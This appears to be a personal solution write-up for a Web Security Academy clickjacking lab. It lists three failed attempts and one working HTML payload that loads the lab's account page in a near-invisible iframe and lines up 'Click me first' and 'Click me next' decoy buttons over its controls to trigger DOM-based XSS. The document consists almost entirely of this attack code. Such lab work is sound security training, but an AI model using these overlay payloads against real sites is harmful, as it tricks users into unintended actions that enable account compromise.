# Clickjacking: Exploiting clickjacking vulnerability to trigger DOM-based XSS

## failed payloads
1. the first step only
```html
<head>
    <style>
        #target_website {
            position:relative;
            width: 1500px;
            height: 900px;
            opacity:0.0001;
            z-index:2;
            }
            
        #decoy_website {
            position:absolute;
            width: 1500px;
            height: 900px;
            z-index:1;
            }

        #decoy_website button {
            position: relative;
            background-color: brown;
            width: 140px;
            height: 35px;
            top: 520px;
            left: 177px
            }
    </style>
</head>
<body>
	<div id="decoy_website">
	    <button>Click me first</button>
	</div>
	<iframe id="target_website" src="https://0a1a005d0354199883aa3ce100e50050.web-security-academy.net/my-account">
	</iframe>
</body>
```
2. the second step added
```html
<head>
    <style>
        #target_website {
            position:relative;
            width: 1500px;
            height: 900px;
            opacity:0.5001;
            z-index:2;
            }
            
        #decoy_website {
            position:absolute;
            width: 1500px;
            height: 900px;
            z-index:1;
            }

        #decoy_website button {
            position: relative;
            background-color: brown;
            width: 140px;
            height: 35px;
            top: 520px;
            left: 177px
            }
    </style>
</head>
<body>
	<div id="decoy_website">
	    <button id="button1">Click me first</button>
	</div>
	<iframe id="target_website" src="https://0a1a005d0354199883aa3ce100e50050.web-security-academy.net/my-account">
	</iframe>
    <script>
        const changeLocationOfButton = function (e) {
            console.log("entered event listener")
            button1.style.width = "131px";
            button1.style.top = "317px";
            button1.style.left = "340px";
            button1.innerHTML = "Click me next";
        }

        console.log("entered script")
        let button1 = document.getElementById("button1");
        button1.addEventListener('click', changeLocationOfButton);
    </script>
</body>
```

3. no need to add event listener it is a conceptual misunderstanding
```html
<head>
    <style>
                #target_website {
            position:relative;
            width: 1500px;
            height: 900px;
            opacity:0.0001;
            z-index:2;
            }
            
        #decoy_website {
            position:absolute;
            width: 1500px;
            height: 900px;
            z-index:1;
            }

        #button2 {
            position: relative;
            background-color: brown;
            width: 140px;
            height: 35px;
            top: 520px;
            left: 177px
        }
        #button1 {
            position: relative;
            background-color: brown;
            width: 140px;
            height: 35px;
            top: 520px;
            left: 177px
        }
    </style>
</head>
<body>
	<div id="decoy_website">
	    <button id="button1">Click me first</button>
	    <button id="button2">Click me next</button>
	</div>
	<iframe id="target_website" src="https://0a50009b04072d8c81f63a0100d700c8.web-security-academy.net/my-account">
	</iframe>
</body>
```

## success payload
```html
<head>
    <style>
                #target_website {
            position:relative;
            width: 1500px;
            height: 900px;
            opacity:0.0001;
            z-index:2;
            }
            
        #decoy_website {
            position:absolute;
            width: 1500px;
            height: 900px;
            z-index:1;
            }

        #button1 {
            position: relative;
            background-color: brown;
            width: 140px;
            height: 35px;
            top: 520px;
            left: 177px
        }
        #button2 {
            position: relative;
            background-color: brown;
            width: 122px;
            height: 35px;
            top: 316px;
            left: 197px
        }
    </style>
</head>
<body>
	<div id="decoy_website">
	    <button id="button1">Click me first</button>
	    <button id="button2">Click me next</button>
	</div>
	<iframe id="target_website" src="https://0a50009b04072d8c81f63a0100d700c8.web-security-academy.net/my-account">
	</iframe>
</body>
```